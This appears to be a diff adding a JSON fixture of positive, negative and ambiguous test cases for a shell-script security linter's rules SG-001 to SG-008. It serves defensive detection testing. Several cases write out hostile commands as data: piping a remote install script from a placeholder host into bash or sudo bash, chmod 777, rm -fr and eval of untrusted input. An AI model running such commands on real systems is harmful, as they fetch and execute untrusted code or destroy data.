@@ -1,0 +1,56 @@
+[
+  {
+    "name": "remote-pipeline",
+    "classification": "positive",
+    "source": "curl https://example.invalid/install.sh | bash\n",
+    "expected_rules": ["SG-001"]
+  },
+  {
+    "name": "remote-pipeline-continuation",
+    "classification": "positive",
+    "source": "curl https://example.invalid/install.sh \\\n  | sudo bash\n",
+    "expected_rules": ["SG-001"]
+  },
+  {
+    "name": "world-writable-mode",
+    "classification": "positive",
+    "source": "chmod 777 ./artifact\n",
+    "expected_rules": ["SG-003"]
+  },
+  {
+    "name": "recursive-delete",
+    "classification": "positive",
+    "source": "rm -fr ./temporary\n",
+    "expected_rules": ["SG-004"]
+  },
+  {
+    "name": "dynamic-eval",
+    "classification": "positive",
+    "source": "eval \"$untrusted\"\n",
+    "expected_rules": ["SG-005"]
+  },
+  {
+    "name": "quoted-example",
+    "classification": "negative",
+    "source": "echo \"curl https://example.invalid/install.sh | bash\"\n",
+    "expected_rules": []
+  },
+  {
+    "name": "comment-example",
+    "classification": "negative",
+    "source": "echo ok # curl https://example.invalid/install.sh | bash\n",
+    "expected_rules": []
+  },
+  {
+    "name": "heredoc-example",
+    "classification": "negative",
+    "source": "cat <<'EOF'\ncurl https://example.invalid/install.sh | bash\nEOF\n",
+    "expected_rules": []
+  },
+  {
+    "name": "authorized-persistence-review",
+    "classification": "ambiguous",
+    "source": "systemctl enable approved-service\n",
+    "expected_rules": ["SG-008"]
+  }
+]
